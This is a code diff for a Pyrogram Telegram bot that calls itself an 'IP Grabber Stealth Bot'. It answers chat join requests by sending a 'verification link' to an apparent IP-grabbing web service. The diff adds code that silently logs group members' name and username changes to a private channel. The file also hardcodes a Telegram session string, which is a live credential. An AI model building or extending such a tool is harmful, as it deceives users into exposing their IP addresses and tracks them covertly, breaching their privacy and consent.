@@ -12,7 +12,10 @@ SESSION_STRING = "BQHy6AcALg8-IFn7jkiIrFq2qi9xZrWhiMY78No7c6ZlSkOAUI2RF3OrW4nATG
 WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
 LOG_CHANNEL = -1002290475903
 
-app = Client("ip_grabber_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
+app = Client("sangmata_ip_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
+
+# Simple in-memory storage (for starter). Later we can upgrade to MongoDB
+user_history = {}
 
 @app.on_chat_join_request()
 async def handle_join_request(client, request):
@@ -34,9 +37,54 @@ async def handle_join_request(client, request):
             "Link will expire in 10 minutes.",
             reply_markup=keyboard
         )
-        print(f"✅ Verification link sent to {user_id}")
     except Exception as e:
-        print(f"❌ Failed to send message to {user_id}: {e}")
+        print(f"Failed to send PM: {e}")
 
-print("✅ IP Grabber Stealth Bot with Sangmata features is running...")
+# Sangmata-like features: Track name and username changes
+@app.on_message(filters.group)
+async def track_user(client, message):
+    if not message.from_user:
+        return
+
+    user = message.from_user
+    user_id = user.id
+
+    if user_id not in user_history:
+        user_history[user_id] = {
+            "first_name": user.first_name,
+            "username": user.username,
+            "created_at": datetime.now()
+        }
+
+    # Check if name or username changed
+    old = user_history[user_id]
+    changed = False
+    log_msg = ""
+
+    if user.first_name != old["first_name"]:
+        log_msg += f"🔄 Name changed: {old['first_name']} → {user.first_name}\n"
+        changed = True
+    if user.username != old.get("username"):
+        log_msg += f"🔄 Username changed: @{old.get('username')} → @{user.username}\n"
+        changed = True
+
+    if changed:
+        log_text = f"""
+🔥 USER UPDATE DETECTED
+
+👤 User: {user.first_name}
+🆔 ID: <code>{user_id}</code>
+{log_msg}
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+        """
+        await client.send_message(LOG_CHANNEL, log_text)
+
+    # Update storage
+    user_history[user_id] = {
+        "first_name": user.first_name,
+        "username": user.username,
+        "created_at": old["created_at"]
+    }
+
+print("✅ Advanced IP Grabber + Sangmata Bot is running...")
 app.run()
